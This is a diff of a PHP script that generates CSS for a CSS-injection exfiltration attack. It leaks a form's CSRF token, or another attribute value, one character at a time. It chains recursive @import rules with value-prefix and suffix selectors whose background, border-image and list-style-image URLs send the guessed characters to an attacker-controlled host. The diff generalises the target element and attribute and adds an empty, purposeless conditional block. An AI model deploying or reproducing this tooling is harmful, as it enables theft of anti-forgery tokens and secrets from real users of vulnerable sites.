@@ -1,6 +1,6 @@
 <?php
     header("Content-Type: text/css"); 
-    require('config.php');
+    require_once('config.php');
 
     // Stop the recursive import if token has leaked
     $leakTokenFile = 'leakToken.txt';
@@ -25,9 +25,7 @@
         }
 
         // Import the next css style to kean the next char
-        echo '
-            @import url(' . $host . 'next.php?len=' . ++$_GET['len'] . ');
-        ';
+        echo '@import url(' . LHOST . LURL_NEXT . '?len=' . ++$_GET["len"] . '&name=' . $_GET["name"] . ');';
 
         // Read leak prechars from file
         $preCharsFile = 'pre.txt';
@@ -40,10 +38,13 @@
 
         // Create the next CSS selectors
         // We can use form:has because recursive import works only on Chrome
-        foreach($alphabet as $char) {            
+        foreach($alphabet as $char) {       
+            if(isset($_GET[''])) {
+
+            }     
             echo '
-                form:has(input[name=csrf-token][value^="' . $preChars . $char . '"])' . str_repeat(":first-child", $_GET['len'])  . ' {
-                    background:url(' . $host . 'leak.php?pre=' . $preChars . $char . ');
+                form:has(' . HTML_ELEMENT_NAME . '[' . HTML_ATTRIBUTE_NAME . '=' . $_GET['name'] . '][value^="' . $preChars . $char . '"])' . str_repeat(":first-child", $_GET['len'])  . ' {
+                    background:url(' . LHOST . LURL_LEAK . '?pre=' . $preChars . $char . ');
                 }
             ';
         }
@@ -61,8 +62,8 @@
         // We can use form:has because recursive import works only on Chrome
         foreach($alphabet as $char) {            
             echo '
-                form:has(input[name=csrf-token][value$="' . $char . $postChars . '"])' . str_repeat(":first-child", $_GET['len'])  . ' {
-                    border-image:url(' . $host . 'leak.php?post=' . $char . $postChars . ');
+                form:has(' . HTML_ELEMENT_NAME . '[' . HTML_ATTRIBUTE_NAME . '=' . $_GET['name'] . '][value$="' . $char . $postChars . '"])' . str_repeat(":first-child", $_GET['len'])  . ' {
+                    border-image:url(' . LHOST . LURL_LEAK . '?post=' . $char . $postChars . ');
                 }
             ';
         }
@@ -70,13 +71,13 @@
         // Check if all the chars from the token are leaked
         // And check if the token has an odd number of characters
         echo '
-            form:has(input[name=csrf-token][value="' . $preChars . ltrim($postChars, $postChars[0]) . '"]) {
-                list-style-image:url(' . $host . 'leak.php?token=' . $preChars . ltrim($postChars, $postChars[0]) . ');
+            form:has(' . HTML_ELEMENT_NAME . '[' . HTML_ATTRIBUTE_NAME . '=' . $_GET['name'] . '][value="' . $preChars . ltrim($postChars, $postChars[0]) . '"]) {
+                list-style-image:url(' . LHOST . LURL_LEAK . '?token=' . $preChars . ltrim($postChars, $postChars[0]) . ');
             }
         ';
         echo '
-            form:has(input[name=csrf-token][value="' . $preChars . $postChars . '"]) {
-                list-style-image:url(' . $host . 'leak.php?token=' . $preChars . $postChars . ');
+            form:has(' . HTML_ELEMENT_NAME . '[' . HTML_ATTRIBUTE_NAME . '=' . $_GET['name'] . '][value="' . $preChars . $postChars . '"]) {
+                list-style-image:url(' . LHOST . LURL_LEAK . '?token=' . $preChars . $postChars . ');
             }
         ';
     }
